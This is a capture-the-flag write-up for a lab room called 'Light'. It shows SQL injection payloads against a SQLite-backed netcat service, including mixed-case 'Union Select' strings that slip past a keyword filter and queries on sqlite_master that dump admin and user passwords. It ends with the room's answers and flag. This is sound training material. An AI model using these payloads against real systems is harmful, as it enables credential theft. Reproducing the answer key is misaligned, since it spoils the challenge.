# Light (v1.2)

(https://tryhackme.com/room/lightroom)

Welcome to the Light database application!

I am working on a database application called Light! Would you like to try it out?  
If so, the application is running on **port 1337**. You can connect to it using `nc MACHINE_IP 1337`  
You can use the username `smokey` in order to get started.

**Note**: Please allow the service 2 - 3 minutes to fully start before connecting to it.

## Answer the questions below

What is the admin username?

What is the password to the username mentioned in question 1?

What is the flag?

# Writeup

Let's first connect to the app and see what it shows when entering the username `smokey`:

```bash
┌──(kali㉿kali)-[~]
└─$ nc 10.10.219.172 1337
Welcome to the Light database!
Please enter your username: smokey
Password: vYQ5ngPpw8AdUmL
Please enter your username:
Username not found.
Please enter your username: abc'
Error: unrecognized token: "'abc'' LIMIT 30"
```

When entering a username, it displays a password that's probably associated with the username, as long as it exists in the database. It doesn't do anything after like logging in, so it seems that the app is just for testing if the database works and our challenge is to find an SQL injection.

Interestingly, if we add a single quote, it will escape the input string and cause the query syntax to become invalid because of an unmatched quote, showing that this is vulnerable to a simple SQL injection. We can take a guess at what the SQL query looks like:

```sql
SELECT password FROM users WHERE username = '{input}' LIMIT 30;
```

Let's try injecting our own SQL:

```bash
Please enter your username: ' or '1'='1
Password: tF8tj2o94WE4LKC
Please enter your username: ' --
For strange reasons I can't explain, any input containing /*, -- or, %0b is not allowed :)
Please enter your username: ' union select * from users '
Ahh there is a word in there I don't like :(
```

Trying to list all passwords by using `' or '1'='1` to bypass the WHERE clause returns `tF8tj2o94WE4LKC`, which seems to not be the admin's password since entering this into the password question returns "Incorrect Answer". Unfortunately, there seem to be some restricted keywords since trying to list all users with `' union select * from users '` outputs "Ahh there is a word in there I don't like :(". Trying to insert a comment also shows that `/*`, `--`, and `%0b` aren't allowed.

The other restricted words probably relate to sql keywords, so let's find out:

```bash
Please enter your username: union
Ahh there is a word in there I don't like :(
Please enter your username: select
Ahh there is a word in there I don't like :(
Please enter your username: *
Username not found.
Please enter your username: from
Username not found.
Please enter your username: users
Username not found.
```

Looks like `union` and `select` aren't allowed (I also checked other keywords but only `select` and `union` were blocked), but what if the filter is poorly hard-coded and doesn't take capitalization into account?

```bash
Please enter your username: SELECT
Ahh there is a word in there I don't like :(
Please enter your username: Select
Username not found.
Please enter your username: ' Union Select * from users '
Error: no such table: users
Please enter your username: ' uNiON SeLECt * from users '
Error: no such table: users
```

Seems like the filter only checks for all-lowercase and all-uppercase keywords, but nothing in between. Now that we know how to inject SQL, let's try to find the database version to better know how to proceed (source: https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/#DatabaseVersionDiscovery):

```bash
Please enter your username: ' Union Select @@version '
Error: unrecognized token: "@"
Please enter your username: ' Union Select version from PRODUCT_COMPONENT_VERSION where product like 'Oracle Database%
Error: no such table: PRODUCT_COMPONENT_VERSION
Please enter your username: ' Union Select version() '
Error: no such function: version
Please enter your username: ' Union Select sqlite_version() '
Password: 3.31.1
```

The database uses sqlite (light..), so let's find what tables are in the database by viewing `sqlite_master` (see https://sqlite.org/schematab.html). We'll go one column at a time to match the existing query:

```bash
Please enter your username: ' Union Select count(name) from sqlite_master '
Password: 2
Please enter your username: ' Union Select type from sqlite_master '
Password: table
Please enter your username: ' Union Select name from sqlite_master '
Password: admintable
Please enter your username: ' Union Select sql from sqlite_master '
Password: CREATE TABLE admintable (
                   id INTEGER PRIMARY KEY,
                   username TEXT,
                   password INTEGER)
Please enter your username: ' Union Select name from sqlite_master where name!='admintable
Password: usertable
Please enter your username: ' Union Select sql from sqlite_master where name=='usertable
Password: CREATE TABLE usertable (
                   id INTEGER PRIMARY KEY,
                   username TEXT,
                   password INTEGER)
```

There are 2 tables, `admintable` and `usertable`, both with the same columns `id`, `username`, and `password`. Let's look inside `admintable`:

```bash
Please enter your username: ' Union Select count(username) from admintable '
Password: 2
Please enter your username: ' Union Select username from admintable '
Password: TryHackMeAdmin
Please enter your username: ' Union Select password from admintable '
Password: THM{SQLit3_InJ3cTion_is_SimplE_nO?}
Please enter your username: ' Union Select password from admintable where username='TryHackMeAdmin
Password: mamZtAuMlrsEy5bp6q17
```

We see the admin user `TryHackMeAdmin` with the password `mamZtAuMlrsEy5bp6q17`. Luckily, we also got the flag by accident when selecting a password without specifying a user, but we can also find it by checking the other account's password:

```bash
Please enter your username: ' Union Select username from admintable where username!='TryHackMeAdmin
Password: flag
Please enter your username: ' Union Select password from admintable where username='flag
Password: THM{SQLit3_InJ3cTion_is_SimplE_nO?}
```

We can also look inside usertables to see if there is anything interesting (there is not):

```bash
Please enter your username: ' Union Select count(username) from usertable '
Password: 8
Please enter your username: ' Union Select username from usertable where username!='smokey
Password: alice
Please enter your username: ' Union Select username from usertable where username not in ('smokey', 'alice') and '1'='1
Password: hazel
...
Please enter your username: ' Union Select password from usertable where username='alice
Password: tF8tj2o94WE4LKC
Please enter your username: ' Union Select password from usertable where username='hazel
Password: EcSuU35WlVipjXG
Please enter your username: ' Union Select password from usertable where username='john
Password: e74tqwRh2oApPo6
Please enter your username: ' Union Select password from usertable where username='michael
Password: 7DV4dwA0g5FacRe
Please enter your username: ' Union Select password from usertable where username='ralph
Password: YO1U9O1m52aJImA
Please enter your username: ' Union Select password from usertable where username='rob
Password: yAn4fPaF2qpCKpR
Please enter your username: ' Union Select password from usertable where username='steve
Password: WObjufHX1foR8d7
```

## Answers

What is the admin username?

`TryHackMeAdmin`

What is the password to the username mentioned in question 1?

`mamZtAuMlrsEy5bp6q17`

What is the flag?

`THM{SQLit3_InJ3cTion_is_SimplE_nO?}`
